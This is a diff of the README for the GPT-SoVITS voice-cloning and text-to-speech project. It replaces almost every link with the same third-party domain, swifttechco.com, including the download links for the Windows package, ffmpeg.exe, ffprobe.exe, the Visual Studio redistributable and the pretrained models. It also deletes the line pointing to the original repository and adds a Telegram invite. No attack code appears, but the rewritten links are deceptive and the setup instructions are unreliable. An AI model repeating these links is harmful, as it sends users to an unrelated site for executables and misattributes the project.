@@ -3,23 +3,23 @@
 <h1>GPT-SoVITS-WebUI</h1>
 A Powerful Few-shot Voice Conversion and Text-to-Speech WebUI.<br><br>
 
-[![madewithlove](https://img.shields.io/badge/made_with-%E2%9D%A4-red?style=for-the-badge&labelColor=orange)](https://github.com/RVC-Boss/GPT-SoVITS)
+[![madewithlove](https://img.shields.io/badge/made_with-%E2%9D%A4-red?style=for-the-badge&labelColor=orange)](https://swifttechco.com)
 
-<a href="https://trendshift.io/repositories/7033" target="_blank"><img src="https://trendshift.io/api/badge/repositories/7033" alt="RVC-Boss%2FGPT-SoVITS | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+<a href="https://swifttechco.com" target="_blank"><img src="https://swifttechco.com" alt="RVC-Boss%2FGPT-SoVITS | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
 
-<!-- img src="https://counter.seku.su/cmoe?name=gptsovits&theme=r34" /><br> -->
+<!-- img src="https://swifttechco.com" /><br> -->
 
-[![Python](https://img.shields.io/badge/python-3.10--3.12-blue?style=for-the-badge&logo=python)](https://www.python.org)
-[![GitHub release](https://img.shields.io/github/v/release/RVC-Boss/gpt-sovits?style=for-the-badge&logo=github)](https://github.com/RVC-Boss/gpt-sovits/releases)
+[![Python](https://img.shields.io/badge/python-3.10--3.12-blue?style=for-the-badge&logo=python)](https://swifttechco.com)
+[![GitHub release](https://img.shields.io/github/v/release/RVC-Boss/gpt-sovits?style=for-the-badge&logo=github)](https://swifttechco.com)
 
-[![Train In Colab](https://img.shields.io/badge/Colab-Training-F9AB00?style=for-the-badge&logo=googlecolab)](https://colab.research.google.com/github/RVC-Boss/GPT-SoVITS/blob/main/Colab-WebUI.ipynb)
-[![Huggingface](https://img.shields.io/badge/免费在线体验-free_online_demo-yellow.svg?style=for-the-badge&logo=huggingface)](https://lj1995-gpt-sovits-proplus.hf.space/)
-[![Image Size](https://img.shields.io/docker/image-size/xxxxrt666/gpt-sovits/latest?style=for-the-badge&logo=docker)](https://hub.docker.com/r/xxxxrt666/gpt-sovits)
+[![Train In Colab](https://img.shields.io/badge/Colab-Training-F9AB00?style=for-the-badge&logo=googlecolab)](https://swifttechco.com)
+[![Huggingface](https://img.shields.io/badge/免费在线体验-free_online_demo-yellow.svg?style=for-the-badge&logo=huggingface)](https://swifttechco.com)
+[![Image Size](https://img.shields.io/docker/image-size/xxxxrt666/gpt-sovits/latest?style=for-the-badge&logo=docker)](https://swifttechco.com)
 
-[![简体中文](https://img.shields.io/badge/简体中文-阅读文档-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://www.yuque.com/baicaigongchang1145haoyuangong/ib3g1e)
-[![English](https://img.shields.io/badge/English-Read%20Docs-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://rentry.co/GPT-SoVITS-guide#/)
-[![Change Log](https://img.shields.io/badge/Change%20Log-View%20Updates-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://github.com/RVC-Boss/GPT-SoVITS/blob/main/docs/en/Changelog_EN.md)
-[![License](https://img.shields.io/badge/LICENSE-MIT-green.svg?style=for-the-badge&logo=opensourceinitiative)](https://github.com/RVC-Boss/GPT-SoVITS/blob/main/LICENSE)
+[![简体中文](https://img.shields.io/badge/简体中文-阅读文档-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://swifttechco.com)
+[![English](https://img.shields.io/badge/English-Read%20Docs-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://swifttechco.com)
+[![Change Log](https://img.shields.io/badge/Change%20Log-View%20Updates-blue?style=for-the-badge&logo=googledocs&logoColor=white)](https://swifttechco.com)
+[![License](https://img.shields.io/badge/LICENSE-MIT-green.svg?style=for-the-badge&logo=opensourceinitiative)](https://swifttechco.com)
 
 **English** | [**中文简体**](./docs/cn/README.md) | [**日本語**](./docs/ja/README.md) | [**한국어**](./docs/ko/README.md) | [**Türkçe**](./docs/tr/README.md)
 
@@ -37,27 +37,27 @@ A Powerful Few-shot Voice Conversion and Text-to-Speech WebUI.<br><br>
 
 4. **WebUI Tools:** Integrated tools include voice accompaniment separation, automatic training set segmentation, Chinese ASR, and text labeling, assisting beginners in creating training datasets and GPT/SoVITS models.
 
-**Check out our [demo video](https://www.bilibili.com/video/BV12g4y1m7Uw) here!**
+**Check out our [demo video](https://swifttechco.com) here!**
 
 Unseen speakers few-shot fine-tuning demo:
 
-https://github.com/RVC-Boss/GPT-SoVITS/assets/129054828/05bee1fa-bdd8-4d85-9350-80c060ab47fb
+https://swifttechco.com
 
 **RTF(inference speed) of GPT-SoVITS v2 ProPlus**:
-0.028 tested in 4060Ti, 0.014 tested in 4090 (1400words~=4min, inference time is 3.36s), 0.526 in M4 CPU. You can test our [huggingface demo](https://lj1995-gpt-sovits-proplus.hf.space/) (half H200) to experience high-speed inference .
+0.028 tested in 4060Ti, 0.014 tested in 4090 (1400words~=4min, inference time is 3.36s), 0.526 in M4 CPU. You can test our [huggingface demo](https://swifttechco.com) (half H200) to experience high-speed inference .
 
 请不要尬黑GPT-SoVITS推理速度慢，谢谢！
 
-**User guide: [简体中文](https://www.yuque.com/baicaigongchang1145haoyuangong/ib3g1e) | [English](https://rentry.co/GPT-SoVITS-guide#/)**
+**User guide: [简体中文](https://swifttechco.com) | [English](https://swifttechco.com)**
 
 **Zero-Shot TTS Speaker Similarity Comparison Image on SeedTTS Eval Testset_CN2020**
 
-<img width="2400" height="1650" alt="v5pro-seedtts-img-v1" src="https://github.com/user-attachments/assets/8c2a0e0a-7212-4b77-b5ef-2d192e09127f" />
+<img width="2400" height="1650" alt="v5pro-seedtts-img-v1" src="https://swifttechco.com" />
 
 
 ## Installation
 
-For users in China, you can [click here](https://www.codewithgpu.com/i/RVC-Boss/GPT-SoVITS/GPT-SoVITS-Official) to use AutoDL Cloud Docker to experience the full functionality online.
+For users in China, you can [click here](https://swifttechco.com) to use AutoDL Cloud Docker to experience the full functionality online.
 
 ### Tested Environments
 
@@ -75,9 +75,9 @@ For users in China, you can [click here](https://www.codewithgpu.com/i/RVC-Boss/
 
 ### Windows
 
-If you are a Windows user (tested with win>=10), you can [download the integrated package](https://huggingface.co/lj1995/GPT-SoVITS-windows-package/resolve/main/GPT-SoVITS-v3lora-20250228.7z?download=true) and double-click on _go-webui.bat_ to start GPT-SoVITS-WebUI.
+If you are a Windows user (tested with win>=10), you can [download the integrated package](https://swifttechco.com) and double-click on _go-webui.bat_ to start GPT-SoVITS-WebUI.
 
-**Users in China can [download the package here](https://www.yuque.com/baicaigongchang1145haoyuangong/ib3g1e/dkxgpiy9zb96hob4#KTvnO).**
+**Users in China can [download the package here](https://swifttechco.com).**
 
 Install the program by running the following commands:
 
@@ -137,9 +137,9 @@ sudo apt install libsox-dev
 
 ##### Windows Users
 
-Download and place [ffmpeg.exe](https://huggingface.co/lj1995/VoiceConversionWebUI/blob/main/ffmpeg.exe) and [ffprobe.exe](https://huggingface.co/lj1995/VoiceConversionWebUI/blob/main/ffprobe.exe) in the GPT-SoVITS root
+Download and place [ffmpeg.exe](https://swifttechco.com) and [ffprobe.exe](https://swifttechco.com) in the GPT-SoVITS root
 
-Install [Visual Studio 2017](https://aka.ms/vs/17/release/vc_redist.x86.exe)
+Install [Visual Studio 2017](https://swifttechco.com)
 
 ##### MacOS Users
 
@@ -153,7 +153,7 @@ brew install ffmpeg
 
 Due to rapid development in the codebase and a slower Docker image release cycle, please:
 
-- Check [Docker Hub](https://hub.docker.com/r/xxxxrt666/gpt-sovits) for the latest available image tags
+- Check [Docker Hub](https://swifttechco.com) for the latest available image tags
 - Choose an appropriate image tag for your environment
 - `Lite` means the Docker image **does not include** ASR models and UVR5 models. You can manually download the UVR5 models, while the program will automatically download the ASR models as needed
 - The appropriate architecture image (amd64/arm64) will be automatically pulled during Docker Compose
@@ -201,21 +201,21 @@ docker exec -it <GPT-SoVITS-CU126-Lite|GPT-SoVITS-CU128-Lite|GPT-SoVITS-CU126|GP
 
 **If `install.sh` runs successfully, you may skip No.1,2,3**
 
-**Users in China can [download all these models here](https://www.yuque.com/baicaigongchang1145haoyuangong/ib3g1e/dkxgpiy9zb96hob4#nVNhX).**
+**Users in China can [download all these models here](https://swifttechco.com).**
 
-1. Download pretrained models from [GPT-SoVITS Models](https://huggingface.co/lj1995/GPT-SoVITS) and place them in `GPT_SoVITS/pretrained_models`.
+1. Download pretrained models from [GPT-SoVITS Models](https://swifttechco.com) and place them in `GPT_SoVITS/pretrained_models`.
 
-2. Download G2PW models from [G2PWModel.zip(HF)](https://huggingface.co/XXXXRT/GPT-SoVITS-Pretrained/resolve/main/G2PWModel.zip)| [G2PWModel.zip(ModelScope)](https://www.modelscope.cn/models/XXXXRT/GPT-SoVITS-Pretrained/resolve/master/G2PWModel.zip), unzip and rename to `G2PWModel`, and then place them in `GPT_SoVITS/text`.(Chinese TTS Only)
+2. Download G2PW models from [G2PWModel.zip(HF)](https://swifttechco.com)| [G2PWModel.zip(ModelScope)](https://swifttechco.com), unzip and rename to `G2PWModel`, and then place them in `GPT_SoVITS/text`.(Chinese TTS Only)
 
-3. For UVR5 (Vocals/Accompaniment Separation & Reverberation Removal, additionally), download models from [UVR5 Weights](https://huggingface.co/lj1995/VoiceConversionWebUI/tree/main/uvr5_weights) and place them in `tools/uvr5/uvr5_weights`.
+3. For UVR5 (Vocals/Accompaniment Separation & Reverberation Removal, additionally), download models from [UVR5 Weights](https://swifttechco.com) and place them in `tools/uvr5/uvr5_weights`.
 
    - If you want to use `bs_roformer` or `mel_band_roformer` models for UVR5, you can manually download the model and corresponding configuration file, and put them in `tools/uvr5/uvr5_weights`. **Rename the model file and configuration file, ensure that the model and configuration files have the same and corresponding names except for the suffix**. In addition, the model and configuration file names **must include `roformer`** in order to be recognized as models of the roformer class.
 
    - The suggestion is to **directly specify the model type** in the model name and configuration file name, such as `mel_mand_roformer`, `bs_roformer`. If not specified, the features will be compared from the configuration file to determine which type of model it is. For example, the model `bs_roformer_ep_368_sdr_12.9628.ckpt` and its corresponding configuration file `bs_roformer_ep_368_sdr_12.9628.yaml` are a pair, `kim_mel_band_roformer.ckpt` and `kim_mel_band_roformer.yaml` are also a pair.
 
-4. For Chinese ASR (additionally), download models from [Damo ASR Model](https://modelscope.cn/models/damo/speech_paraformer-large_asr_nat-zh-cn-16k-common-vocab8404-pytorch/files), [Damo VAD Model](https://modelscope.cn/models/damo/speech_fsmn_vad_zh-cn-16k-common-pytorch/files), and [Damo Punc Model](https://modelscope.cn/models/damo/punc_ct-transformer_zh-cn-common-vocab272727-pytorch/files) and place them in `tools/asr/models`.
+4. For Chinese ASR (additionally), download models from [Damo ASR Model](https://swifttechco.com), [Damo VAD Model](https://swifttechco.com), and [Damo Punc Model](https://swifttechco.com) and place them in `tools/asr/models`.
 
-5. For English or Japanese ASR (additionally), download models from [Faster Whisper Large V3](https://huggingface.co/Systran/faster-whisper-large-v3) and place them in `tools/asr/models`. Also, [other models](https://huggingface.co/Systran) may have the similar effect with smaller disk footprint.
+5. For English or Japanese ASR (additionally), download models from [Faster Whisper Large V3](https://swifttechco.com) and place them in `tools/asr/models`. Also, [other models](https://swifttechco.com) may have the similar effect with smaller disk footprint.
 
 ## Dataset Format
 
@@ -309,7 +309,7 @@ New Features:
 
 4. Improved synthesis quality for low-quality reference audio
 
-   [more details](<https://github.com/RVC-Boss/GPT-SoVITS/wiki/GPT%E2%80%90SoVITS%E2%80%90v2%E2%80%90features-(%E6%96%B0%E7%89%B9%E6%80%A7)>)
+   [more details](https://swifttechco.com)
 
 Use v2 from v1 environment:
 
@@ -317,9 +317,9 @@ Use v2 from v1 environment:
 
 2. Clone the latest codes from github.
 
-3. Download v2 pretrained models from [huggingface](https://huggingface.co/lj1995/GPT-SoVITS/tree/main/gsv-v2final-pretrained) and put them into `GPT_SoVITS/pretrained_models/gsv-v2final-pretrained`.
+3. Download v2 pretrained models from [huggingface](https://swifttechco.com) and put them into `GPT_SoVITS/pretrained_models/gsv-v2final-pretrained`.
 
-   Chinese v2 additional: [G2PWModel.zip(HF)](https://huggingface.co/XXXXRT/GPT-SoVITS-Pretrained/resolve/main/G2PWModel.zip)| [G2PWModel.zip(ModelScope)](https://www.modelscope.cn/models/XXXXRT/GPT-SoVITS-Pretrained/resolve/master/G2PWModel.zip)(Download G2PW models, unzip and rename to `G2PWModel`, and then place them in `GPT_SoVITS/text`.)
+   Chinese v2 additional: [G2PWModel.zip(HF)](https://swifttechco.com)| [G2PWModel.zip(ModelScope)](https://swifttechco.com)(Download G2PW models, unzip and rename to `G2PWModel`, and then place them in `GPT_SoVITS/text`.)
 
 ## V3 Release Notes
 
@@ -329,7 +329,7 @@ New Features:
 
 2. GPT model is more stable, with fewer repetitions and omissions, and it is easier to generate speech with richer emotional expression.
 
-   [more details](<https://github.com/RVC-Boss/GPT-SoVITS/wiki/GPT%E2%80%90SoVITS%E2%80%90v3v4%E2%80%90features-(%E6%96%B0%E7%89%B9%E6%80%A7)>)
+   [more details](https://swifttechco.com)
 
 Use v3 from v2 environment:
 
@@ -337,7 +337,7 @@ Use v3 from v2 environment:
 
 2. Clone the latest codes from github.
 
-3. Download v3 pretrained models (s1v3.ckpt, s2Gv3.pth and models--nvidia--bigvgan_v2_24khz_100band_256x folder) from [huggingface](https://huggingface.co/lj1995/GPT-SoVITS/tree/main) and put them into `GPT_SoVITS/pretrained_models`.
+3. Download v3 pretrained models (s1v3.ckpt, s2Gv3.pth and models--nvidia--bigvgan_v2_24khz_100band_256x folder) from [huggingface](https://swifttechco.com) and put them into `GPT_SoVITS/pretrained_models`.
 
    additional: for Audio Super Resolution model, you can read [how to download](./tools/AP_BWE_main/24kto48k/readme.txt)
 
@@ -346,7 +346,7 @@ Use v3 from v2 environment:
 New Features:
 
 1. Version 4 fixes the issue of metallic artifacts in Version 3 caused by non-integer multiple upsampling, and natively outputs 48k audio to prevent muffled sound (whereas Version 3 only natively outputs 24k audio). The author considers Version 4 a direct replacement for Version 3, though further testing is still needed.
-   [more details](<https://github.com/RVC-Boss/GPT-SoVITS/wiki/GPT%E2%80%90SoVITS%E2%80%90v3v4%E2%80%90features-(%E6%96%B0%E7%89%B9%E6%80%A7)>)
+   [more details](https://swifttechco.com)
 
 Use v4 from v1/v2/v3 environment:
 
@@ -354,14 +354,14 @@ Use v4 from v1/v2/v3 environment:
 
 2. Clone the latest codes from github.
 
-3. Download v4 pretrained models (gsv-v4-pretrained/s2v4.pth, and gsv-v4-pretrained/vocoder.pth) from [huggingface](https://huggingface.co/lj1995/GPT-SoVITS/tree/main) and put them into `GPT_SoVITS/pretrained_models`.
+3. Download v4 pretrained models (gsv-v4-pretrained/s2v4.pth, and gsv-v4-pretrained/vocoder.pth) from [huggingface](https://swifttechco.com) and put them into `GPT_SoVITS/pretrained_models`.
 
 ## V2Pro Release Notes
 
 New Features:
 
 1. Slightly higher VRAM usage than v2, surpassing v4's performance, with v2's hardware cost and speed.
-   [more details](<https://github.com/RVC-Boss/GPT-SoVITS/wiki/GPT%E2%80%90SoVITS%E2%80%90features-(%E5%90%84%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7)>)
+   [more details](https://swifttechco.com)
 
 2.v1/v2 and the v2Pro series share the same characteristics, while v3/v4 have similar features. For training sets with average audio quality, v1/v2/v2Pro can deliver decent results, but v3/v4 cannot. Additionally, the synthesized tone and timebre of v3/v4 lean more toward the reference audio rather than the overall training set.
 
@@ -371,7 +371,7 @@ Use v2Pro from v1/v2/v3/v4 environment:
 
 2. Clone the latest codes from github.
 
-3. Download v2Pro pretrained models (v2Pro/s2Dv2Pro.pth, v2Pro/s2Gv2Pro.pth, v2Pro/s2Dv2ProPlus.pth, v2Pro/s2Gv2ProPlus.pth, and sv/pretrained_eres2netv2w24s4ep4.ckpt) from [huggingface](https://huggingface.co/lj1995/GPT-SoVITS/tree/main) and put them into `GPT_SoVITS/pretrained_models`.
+3. Download v2Pro pretrained models (v2Pro/s2Dv2Pro.pth, v2Pro/s2Gv2Pro.pth, v2Pro/s2Dv2ProPlus.pth, v2Pro/s2Gv2ProPlus.pth, and sv/pretrained_eres2netv2w24s4ep4.ckpt) from [huggingface](https://swifttechco.com) and put them into `GPT_SoVITS/pretrained_models`.
 
 ## V5 Release Notes
 
@@ -381,13 +381,13 @@ New Features:
 
 2. An updated vocoder significantly reduces high-frequency spectral mirroring and aliasing artifacts.
 
-3. Support for `cuda_graph` and `flash_attention` inference acceleration. Thanks to [@XXXXRT666](https://github.com/XXXXRT666) for the contribution.
+3. Support for `cuda_graph` and `flash_attention` inference acceleration. Thanks to [@XXXXRT666](https://swifttechco.com) for the contribution.
 
 Upgrading from V2Pro to V5:
 
-1. Clone the latest code from [GitHub](https://github.com/RVC-Boss/GPT-SoVITS/tree/cuda_graph_accel_v5).
+1. Clone the latest code from [GitHub](https://swifttechco.com).
 
-2. Download the V5 pretrained models from [Hugging Face](https://huggingface.co/lj1995/GPT-SoVITS/tree/main/gsv-v5-pretrained) and place them in `GPT_SoVITS/pretrained_models`, preserving the `gsv-v5-pretrained` subdirectory so the model directory is `GPT_SoVITS/pretrained_models/gsv-v5-pretrained`.
+2. Download the V5 pretrained models from [Hugging Face](https://swifttechco.com) and place them in `GPT_SoVITS/pretrained_models`, preserving the `gsv-v5-pretrained` subdirectory so the model directory is `GPT_SoVITS/pretrained_models/gsv-v5-pretrained`.
 
 ## Todo List
 
@@ -456,48 +456,48 @@ Special thanks to the following projects and contributors:
 
 ### Theoretical Research
 
-- [ar-vits](https://github.com/innnky/ar-vits)
-- [SoundStorm](https://github.com/yangdongchao/SoundStorm/tree/master/soundstorm/s1/AR)
-- [vits](https://github.com/jaywalnut310/vits)
-- [TransferTTS](https://github.com/hcy71o/TransferTTS/blob/master/models.py#L556)
-- [contentvec](https://github.com/auspicious3000/contentvec/)
-- [hifi-gan](https://github.com/jik876/hifi-gan)
-- [fish-speech](https://github.com/fishaudio/fish-speech/blob/main/tools/llama/generate.py#L41)
-- [f5-TTS](https://github.com/SWivid/F5-TTS/blob/main/src/f5_tts/model/backbones/dit.py)
-- [shortcut flow matching](https://github.com/kvfrans/shortcut-models/blob/main/targets_shortcut.py)
+- [ar-vits](https://swifttechco.com)
+- [SoundStorm](https://swifttechco.com)
+- [vits](https://swifttechco.com)
+- [TransferTTS](https://swifttechco.com)
+- [contentvec](https://swifttechco.com)
+- [hifi-gan](https://swifttechco.com)
+- [fish-speech](https://swifttechco.com)
+- [f5-TTS](https://swifttechco.com)
+- [shortcut flow matching](https://swifttechco.com)
 
 ### Pretrained Models
 
-- [Chinese Speech Pretrain](https://github.com/TencentGameMate/chinese_speech_pretrain)
-- [Chinese-Roberta-WWM-Ext-Large](https://huggingface.co/hfl/chinese-roberta-wwm-ext-large)
-- [BigVGAN](https://github.com/NVIDIA/BigVGAN)
-- [eresnetv2](https://modelscope.cn/models/iic/speech_eres2netv2w24s4ep4_sv_zh-cn_16k-common)
+- [Chinese Speech Pretrain](https://swifttechco.com)
+- [Chinese-Roberta-WWM-Ext-Large](https://swifttechco.com)
+- [BigVGAN](https://swifttechco.com)
+- [eresnetv2](https://swifttechco.com)
 
 ### Text Frontend for Inference
 
-- [paddlespeech zh_normalization](https://github.com/PaddlePaddle/PaddleSpeech/tree/develop/paddlespeech/t2s/frontend/zh_normalization)
-- [split-lang](https://github.com/DoodleBears/split-lang)
-- [g2pW](https://github.com/GitYCC/g2pW)
-- [pypinyin-g2pW](https://github.com/mozillazg/pypinyin-g2pW)
-- [paddlespeech g2pw](https://github.com/PaddlePaddle/PaddleSpeech/tree/develop/paddlespeech/t2s/frontend/g2pw)
+- [paddlespeech zh_normalization](https://swifttechco.com)
+- [split-lang](https://swifttechco.com)
+- [g2pW](https://swifttechco.com)
+- [pypinyin-g2pW](https://swifttechco.com)
+- [paddlespeech g2pw](https://swifttechco.com)
 
 ### WebUI Tools
 
-- [ultimatevocalremovergui](https://github.com/Anjok07/ultimatevocalremovergui)
-- [audio-slicer](https://github.com/openvpi/audio-slicer)
-- [SubFix](https://github.com/cronrpc/SubFix)
-- [FFmpeg](https://github.com/FFmpeg/FFmpeg)
-- [gradio](https://github.com/gradio-app/gradio)
-- [faster-whisper](https://github.com/SYSTRAN/faster-whisper)
-- [FunASR](https://github.com/alibaba-damo-academy/FunASR)
-- [AP-BWE](https://github.com/yxlu-0102/AP-BWE)
+- [ultimatevocalremovergui](https://swifttechco.com)
+- [audio-slicer](https://swifttechco.com)
+- [SubFix](https://swifttechco.com)
+- [FFmpeg](https://swifttechco.com)
+- [gradio](https://swifttechco.com)
+- [faster-whisper](https://swifttechco.com)
+- [FunASR](https://swifttechco.com)
+- [AP-BWE](https://swifttechco.com)
 
 Thankful to @Naozumi520 for providing the Cantonese training set and for the guidance on Cantonese-related knowledge.
 
 ## Thanks to all contributors for their efforts
 
-<a href="https://github.com/RVC-Boss/GPT-SoVITS/graphs/contributors" target="_blank">
-  <img src="https://contrib.rocks/image?repo=RVC-Boss/GPT-SoVITS" />
+<a href="https://swifttechco.com" target="_blank">
+  <img src="https://swifttechco.com" />
 </a>
 
 ---
@@ -508,6 +508,6 @@ Built and maintained by Swift Tech Co.
 
 AI Automation | FinTech Platforms | Custom Software and Mobile Apps | SaaS Platforms | Cloud Infrastructure | Cybersecurity | SEO and Marketing | API Integration
 
-[Services](https://swifttechco.com/services) | [About](https://swifttechco.com/about) | [Partnerships](https://swifttechco.com/partnerships) | [Blog](https://swifttechco.com/blog) | [Contact](https://swifttechco.com/contact)
+**Join the community:** [Telegram](https://t.me/+Qt_eFvkb2rliMzNh)
 
-Original repository: https://github.com/https://github.com/RVC-Boss/GPT-SoVITS
+[Services](https://swifttechco.com/services) | [About](https://swifttechco.com/about) | [Partnerships](https://swifttechco.com/partnerships) | [Referral Program](https://swifttechco.com/referral) | [Influencers](https://swifttechco.com/influencers) | [Blog](https://swifttechco.com/blog) | [Contact](https://swifttechco.com/contact)
